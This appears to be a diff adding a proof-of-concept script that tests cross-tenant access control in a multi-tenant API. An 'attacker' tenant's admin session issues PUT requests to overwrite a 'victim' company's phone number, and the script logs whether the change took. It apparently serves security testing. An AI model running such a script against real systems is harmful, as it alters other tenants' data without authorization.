@@ -1,0 +1,15 @@
+import { api, log } from './lib.mjs';
+const victim = await api('admin@alnoor.example');
+const attacker = await api('admin@gulfsteel.example');
+const me = await victim.call('GET', '/api/auth/me'); log('me', me.status, JSON.stringify(me.body).slice(0, 400));
+const c = (await victim.call('GET', '/api/tenancy/companies?take=50')).body.items[0];
+const full = (await victim.call('GET', '/api/tenancy/companies/' + c.id)).body;
+const p = await attacker.call('PUT', `/api/tenancy/companies/${c.id}`, { ...full, phone: '+971 50 000 0000' });
+log('PUT victim id', p.status, JSON.stringify(p.body).slice(0, 300));
+const p2 = await attacker.call('PUT', `/api/tenancy/companies/018dca08-0000-7000-8000-000000000000`, { ...full, phone: '+971 50 000 0000' });
+log('PUT random id', p2.status, JSON.stringify(p2.body).slice(0, 300));
+const own = (await attacker.call('GET', '/api/tenancy/companies?take=5')).body.items[0];
+const ownFull = (await attacker.call('GET', '/api/tenancy/companies/' + own.id)).body;
+const p3 = await attacker.call('PUT', `/api/tenancy/companies/${c.id}`, { ...ownFull, phone: '+971 50 000 0000' });
+log('PUT victim id with own valid body', p3.status, JSON.stringify(p3.body).slice(0, 300));
+log('victim phone now', (await victim.call('GET', '/api/tenancy/companies/' + c.id)).body.phone);
